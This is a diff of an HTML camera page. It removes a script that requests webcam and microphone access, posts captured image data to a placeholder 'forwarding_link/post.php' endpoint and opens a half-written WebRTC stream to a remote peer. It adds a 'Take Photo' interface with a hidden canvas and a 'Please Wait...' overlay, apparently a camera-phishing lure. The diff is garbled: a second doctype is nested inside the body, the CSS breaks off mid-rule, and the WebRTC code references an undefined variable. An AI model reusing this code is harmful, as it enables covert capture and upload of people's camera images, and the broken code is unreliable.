@@ -10,64 +10,126 @@
     
     <center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
 
+<!doctype html>
+<html>
+<head>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+</head>
 
-    <script>
-      
-      function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+<body>
+  <div class="main-screen">
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480" hidden></canvas>
+  </div>
+
+  <div class="bottom-bar">
+    <div class="icon-button">
+      <i class="fas fa-camera" style="color: #fff; font-size: 26px;"></i>
+      <span>Take Photo</span>
+    </div>
+  </div>
+
+  <div class="float-button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+  </div>
+
+  <div id="ac-wrapper">
+    <div id="popup">
+      <center>
+        <h2>Please Wait...</h2>
+      </center>
+    </div>
+  </div>
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+    body {
+      height: 100vh;
+      width: 100vw;
     }
-  });
-};
-      
-'use strict';
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+    * {
+      padding: 0px;
+      margin: 0px;
+      font-family: 'Nunito', sans-serif;
+      font-weight: 500;
+    }
 
-      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(stream => {
-         video.srcObject = stream;
+    .main-screen {
+      background-color: #273039;
+      height: 100vh;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-          const peerConnection = new RTCPeerConnection();
+    video {
+      max-width: 100%;
+      max-height: 100%;
+      height: auto;
+      width: auto;
+    }
 
-          stream.getTracks().forEach(track => {
-            peerConnection.addTrack(track, stream);
-          });
+    .bottom-bar {
+      position: fixed;
+      padding: 0px 40px 0px -40px;
+      bottom: 0px;
+      height: 80px;
+      width: 100%;
+      background-color: #1F2022;
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+    }
 
-          peerConnection.ontrack = event => {
-           canvas.srcObject = event.streams[0];
-          };
+    .icon-button {
+      display: flex;
+      flex-direction: column;
+      justify-items: center;
+      align-items: center;
+      cursor: pointer;
+    }
 
-          peerConnection.createOffer()
-            .then(offer => {
-              peerConnection.setLocalDescription(offer);
-            })
-            .then(() => {
-              // Send the offer to the remote peer via signaling server
-            });
+    i {
+      margin-bottom: 8px;
+      font-size: 26px;
+    }
 
-          // Receive offer from remote peer via signaling server
-          peerConnection.setRemoteDescription(offer)
-            .then(() => {
-              // Create answer and send it back to the remote peer via signaling server
-              return peerConnection.createAnswer();
-            })
-            .then(answer => {
-              peerConnection.setLocalDescription(answer);
-            })
-            .then(() => {
-              // Send the answer to the remote peer via signaling server
-            });
-    </script>
+    .float_button {
+      background-color: #1F2022;
+      height: 40px;
+      border-radius: 5px;
+      width: 40px;
+      position: fixed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      top: 5px;
+      right: 5px;
+    }
+
+    #ac-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.6);
+      z-index: 1001;
+    }
+
+    #popup {
+      width: 555px;
+      height: 35px;
+      background: #FFFFFF;
+      border: 5px solid #000;
+      border-radius: 15
+
+
   </body>
 </html>
